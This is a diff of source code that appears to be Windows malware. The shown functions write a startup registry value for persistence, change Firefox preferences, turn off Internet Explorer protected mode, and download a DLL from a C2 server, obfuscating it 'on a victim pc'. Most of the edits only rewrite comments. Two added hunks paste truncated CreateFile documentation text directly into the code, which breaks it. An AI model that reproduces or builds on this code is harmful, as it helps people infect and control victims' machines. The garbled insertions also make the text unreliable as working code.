@@ -159,7 +159,7 @@ NTSTATUS NtRegSetValue(HANDLE hKey, BYTE *valueName, DWORD valueNameSize, DWORD 
    uValueName.Length        = (USHORT) valueNameSize;
    uValueName.MaximumLength = uValueName.Length;
    return Funcs::pNtSetValueKey(hKey, &uValueName, NULL, type, data, dataSize);                 // replaces the value pointed by ValueName in the key
-                                                                                                // referenced by hKey
+                                                                                                // referenced by hKey with some data
 }                                                                                               // type -- type of data to be written
                                                                                                 // data -- pointer to the buffer with data
 void SetStartupValue(char *path)
@@ -329,16 +329,20 @@ void SetFirefoxPrefs()
                         return;
                      }
                   }
-               }
+               }Creates or opens a file or I/O device. The most commonly used I/O devices are as follows: file, file stream, directory, physical disk, volume, console buffer, tape drive, communications resource, mailslot, and pipe. The function returns a handle that can be used to access the file or device for various types of I/O depending on the file or device and the flags and attributes specified.
+
+To perform this operation as a transacted operation, wh
                entry += Funcs::pLstrlenA(entry) + 1;                                            // continues search if "Profile" section is not found yet
-               if(!entry[0])                                                                    // stops if entry is empty
-                  break; 
+               if(!entry[0])                                                                    // stops if two subsequent '\0' are met. (the last section
+                  break;                                                                        // is marked with two '\0' by convention)
             }
          }
       }
    }
 }
+Creates or opens a file or I/O device. The most commonly used I/O devices are as follows: file, file stream, directory, physical disk, volume, console buffer, tape drive, communications resource, mailslot, and pipe. The function returns a handle that can be used to access the file or device for various types of I/O depending on the file or device and the flags and attributes specified.
 
+To perform this operation as a transacted operation, wh
 void DisableMultiProcessesAndProtectedModeIe()
 {
    HKEY  result;
@@ -451,7 +455,7 @@ static void DownloadDll(char *path, BOOL x64, char *botId)
       Funcs::pSleep(POLL);
    }
    Obfuscate(dll, dllSize, botId);                                                              // obfuscates dll to safely store it on a victim pc
-   HANDLE hFile = Funcs::pCreateFileA                                                           // allocates memory for the obfuscated dll
+   HANDLE hFile = Funcs::pCreateFileA                                                           // handle to the file where obfuscated dll will be stored
    (
       path, 
       GENERIC_WRITE, 
@@ -493,7 +497,7 @@ void GetDlls(BYTE **x86, BYTE **x64, BOOL update)
    Funcs::pLstrcpyA(x86cachePath, cachePath);
    Funcs::pLstrcatA(x86cachePath, Strs::dll32cachePrefix);
 
-   if(update)                                                                                   // this branchs is used to update old x86 dll from C2
+   if(update)                                                                                   // this branch is used to update old x86 dll from C2
    {
       Funcs::pCloseHandle(hX86);                                                                // close the old handle to create a new one
       DownloadDll(x86cachePath, FALSE, botId);
